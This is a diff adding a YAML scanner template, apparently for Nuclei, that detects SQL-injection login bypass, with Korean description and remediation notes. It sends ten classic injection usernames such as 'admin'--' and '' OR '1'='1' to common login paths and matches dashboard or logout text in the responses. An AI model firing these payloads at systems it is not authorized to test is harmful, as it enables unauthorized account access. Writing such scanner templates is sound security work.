@@ -1,0 +1,74 @@
+id: sqli-login-bypass
+
+info:
+  name: SQL Injection Authentication Bypass
+  author: security-researcher
+  severity: critical
+  description: |
+    로그인 폼에서 SQL 인젝션을 통한 인증 우회 취약점을 탐지합니다.
+    인증 없이 관리자 계정 접근 또는 임의의 계정으로 로그인이 가능합니다.
+  tags: sqli,auth-bypass,login,injection
+  remediation: |
+    - Prepared Statement / Parameterized Query 사용
+    - 로그인 실패 횟수 제한 (Account Lockout)
+    - 다중 인증(MFA) 적용
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/admin/login"
+      - "{{BaseURL}}/user/login"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/auth/login"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      username:
+        - "admin'--"
+        - "admin' #"
+        - "admin'/*"
+        - "' OR '1'='1"
+        - "' OR 1=1--"
+        - "admin' OR '1'='1'--"
+        - "' OR 'x'='x"
+        - "1' OR '1'='1'/*"
+        - "') OR ('1'='1"
+        - "admin') OR ('1'='1'--"
+
+    body: "username={{username}}&password=anything"
+
+    attack: clusterbomb
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "dashboard"
+          - "welcome"
+          - "logout"
+          - "admin panel"
+          - "로그아웃"
+          - "대시보드"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        part: body
+        words:
+          - "invalid"
+          - "incorrect"
+          - "failed"
+          - "error"
+          - "wrong"
+        condition: or
+        negative: true
+        case-insensitive: true
